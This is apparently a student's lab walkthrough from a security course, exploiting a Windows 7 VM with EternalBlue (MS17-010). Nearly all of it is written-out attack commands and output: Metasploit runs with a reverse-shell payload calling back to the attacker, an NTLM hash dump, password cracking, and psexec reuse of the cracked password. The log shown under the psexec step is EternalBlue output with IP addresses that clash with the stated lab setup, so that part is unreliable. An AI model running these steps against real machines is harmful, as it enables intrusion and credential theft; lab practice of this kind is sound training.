# 🔥 EternalBlue Exploit Walkthrough - Windows 7 Lab

# link: https://academy.tcm-sec.com/courses/1152300/lectures/34117487
## 📌 Objective

Exploit a vulnerable Windows 7 machine using MS17-010 (EternalBlue), gain Meterpreter access, dump NTLM password hashes, and crack them.

---

## 🧱 Lab Setup

| System       | IP Address   | Role                  |
| ------------ | ------------ | --------------------- |
| Kali Linux   | 192.168.178.37 | Attacker (Metasploit) |
| Windows 7 VM | 192.168.178.38 | Target (SMB enabled)  |

**Network Mode**: Both VMs set to **Bridged Adapter** mode (in VMware)

### 🔎 Finding the VM on the network

* Both Kali and Windows 7 are in bridged mode to appear on the same LAN subnet.
* On Kali, used the following to discover live hosts:

```bash
nmap -sn 192.168.178.0/24
```

Identified the Windows 7 VM at `192.168.178.38`.

---

## 🔍 1. Check for MS17-010 Vulnerability

```bash
nmap -p 445 --script smb-vuln-ms17-010 192.168.178.38
```

📉 Output:

```
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

---

## 💣 2. Exploit with Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.178.38
set LHOST 192.168.178.37
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set EXITFUNC thread
exploit
```

📉 Result:

```bash
[*] Sending stage ...
[*] Meterpreter session 1 opened
```

---

## 🛠️ 3. Post-Exploitation (Hash Dump)

### View sessions:

```bash
sessions
sessions -i 1
```

### Dump password hashes:

```bash
hashdump
```

🖜 Extracted NTLM hashes:

```
user:1000:...:2b576acbe6bcfda7294d6bd18041b8fe:::
```

---

## 🔐 4. Crack NTLM Hash

### Attempt with hashcat + rockyou:

```bash
echo "2b576acbe6bcfda7294d6bd18041b8fe" > hash.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

🔴 Status: **Exhausted (not found)**

### Cracked online via CrackStation.net:

```
Password123!
```

---

## 🛋️ 5. Reuse via Psexec with Plaintext Password

```bash
use exploit/windows/smb/psexec
set RHOST 192.168.178.38
set SMBUser user
set SMBPass Password123!
set LHOST 192.168.178.37
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

📉 Result:

```
[*] Started reverse TCP handler on 192.168.2.37:4444 
[*] 192.168.2.38:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.2.38:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.2.38:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.2.38:445 - The target is vulnerable.
[*] 192.168.2.38:445 - Connecting to target for exploitation.
[+] 192.168.2.38:445 - Connection established for exploitation.
[+] 192.168.2.38:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.2.38:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.2.38:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.2.38:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.2.38:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.2.38:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.2.38:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.2.38:445 - Sending all but last fragment of exploit packet
[*] 192.168.2.38:445 - Starting non-paged pool grooming
[+] 192.168.2.38:445 - Sending SMBv2 buffers
[+] 192.168.2.38:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.2.38:445 - Sending final SMBv2 buffers.
[*] 192.168.2.38:445 - Sending last fragment of exploit packet!
[*] 192.168.2.38:445 - Receiving response from exploit packet
[+] 192.168.2.38:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.2.38:445 - Sending egg to corrupted connection.
[*] 192.168.2.38:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 192.168.178.38
[*] Meterpreter session 1 opened (192.168.178.37:4444 -> 192.168.178.38:49158) at 2025-06-23 23:37:30 +0200
[+] 192.168.2.38:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.2.38:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.2.38:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

---

## 🔒 Takeaways

* EternalBlue is still exploitable in unpatched environments
* Hashdump + NTLM cracking is a fast route to further access
* Even simple passwords like `Password123!` are still common
* Pass-the-Hash and plaintext reuse are both viable
* hashdump is not a windows commadn but a a Meterpreter command
---

✅ End of walkthrough — consider chaining to privilege escalation or lateral movement next.